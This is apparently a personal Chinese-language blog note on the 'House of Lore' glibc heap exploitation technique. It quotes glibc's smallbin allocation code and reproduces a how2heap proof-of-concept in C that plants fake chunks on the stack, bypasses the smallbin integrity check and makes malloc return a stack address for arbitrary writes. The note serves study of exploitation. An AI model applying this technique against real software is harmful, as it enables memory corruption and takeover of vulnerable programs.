---
title: house of lore
date: 2016-10-19 04:41:22
tags:
- heap
- exploit
categories:
- heap_exploit
---

house of lore，我认为是house of *利用方式中利用条件比较难满足的吧，个人觉得实际很难遇到这种情况。所以就简单记录一下，不想浪费太多时间在这。还有house of mind和house of prime就以后碰到相关的题再记录了，因为平时好像几乎没怎么碰到过。

## 利用条件

1. Two chunks are allocated and the first one is overflowable。
2. The second chunk is freed。
3. Another (potentially more) chunk, bigger than the second one, is allocated。
4. A new chunk with the same size of the second one is allocated。
5. Another chunk with the same size of the second one is allocated。

觉得这描述的很好，所以就无耻的照搬了~~~我用中文也是翻译一下，倒还不如用参考的英文描述。
<!-- more -->
## 利用详解

先看一下漏洞代码：
```c
void_t*
_int_malloc(mstate av, size_t bytes)
{
  [...]

  checked_request2size(bytes, nb);

  [...]

  if ((unsigned long)(nb) <= (unsigned long)(av->max_fast)) {
    [...]
  }

  [...]

  /*
    If a small request, check regular bin.  Since these "smallbins"
    hold one size each, no searching within bins is necessary.
    (For a large request, we need to wait until unsorted chunks are
    processed to find best fit. But for small ones, fits are exact
    anyway, so we can check now, which is faster.)
  */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          if (victim == 0) /* initialization check */
            malloc_consolidate (av);
          else
            {
              bck = victim->bk;                //!!!!!!!this is the point!!!!
	if (__glibc_unlikely (bck->fd != victim))    //attention the check!!!!!  (1)
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;

              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
    }
```
首先要执行这段代码malloc请求大小(经过转化，是internal size)要在smallbin范围内(largebin的对应代码已经修复，所以无法利用largebin了), 即在64到512字节间。
那么如果我们能控制victim->bk字段，将其改为栈上的地址(一般是栈上), 最后连续malloc两次，bk字段的指针将返回给用户(chunk2mem)。然后就能对相关内存进行任意写了(例如覆盖栈上返回地址)。

要注意的是上面有个检测(1)，以前好像是没有的，所以还需要设置相应的字段，不能简单的覆盖bk字段就行了。

## 利用举例

我还是拿另一份参考源代码来说明下。我觉得下面这个例子实在讲得很好，一看就懂，所以也就直接拿来用了。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  printf("\nWelcome to the House of Lore\n");
  printf("This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  printf("Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);     /*first malloc*/
  printf("Allocated the first small chunk on the heap at %p\n", victim);

  // victim-8 because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  printf("stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  printf("stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  printf("Create a fake chunk on the stack.");
  printf("Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  printf("Allocating another chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);    /*second malloc*/
  printf("Allocated the large chunk on the heap at %p\n", p5);


  printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);       /*free the first*/

  printf("\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  printf("victim->fwd: %p\n", (void *)victim[0]);
  printf("victim->bk: %p\n\n", (void *)victim[1]);

  printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  printf("This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);  /*third malloc*/
  printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  printf("The victim chunk has been sorted and its fwd and bk pointers updated\n");
  printf("victim->fwd: %p\n", (void *)victim[0]);
  printf("victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  printf("Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  /*actually, we need a chunk to overwrite the bk field, but for convenience, 
  we directly change the value of bk field*/

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  printf("Now allocating a chunk with size equal to the first one freed\n");
  printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);   /*forth malloc*/


  printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);  /*fifth malloc*/
  printf("p4 = malloc(100)\n");

  printf("\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  printf("\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
}
```

我在上面标注了malloc的次数，其实最少得6次，上面只有5次，因为他直接改了bk字段的值, 没有overwrite。总体来说是下面的顺序：
1.malloc(n)---->2.malloc(n)---->3.malloc(n) ---->4.free(2)---->5.malloc(n+m)---->6.overflow chunk2---->7.malloc(n)---->8.malloc(n)。步骤3是为了防止步骤2的chunk和top chunk合并。步骤5是为了让chunk 2 link到相应的samllbin中。

上面代码中讲得非常清楚了。我只是将它记录一下，以备下次忘了能看看。那些malloc的请求大小只需要满足条件就行了，并不一定要像例子那样这么大。
另外需要注意的是free chunk时，该chunk首先link到unsorted bin中。然后下一次分配的大小如果比它大，那么将从top chunk上分配相应大小，而该chunk会被取下link到相应的bin中。如果比它小(相等则直接返回)，则从该chunk上切除相应大小，并返回相应chunk，剩下的成为last reminder chunk，还是存在unsorted bin中。

执行效果如下：
<img src="http://of38fq57s.bkt.clouddn.com/house-of-lore.PNG">

## 相关参考

[X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS](https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/)
[how2heap/house_of_lore.c](https://github.com/shellphish/how2heap/blob/master/house_of_lore.c)


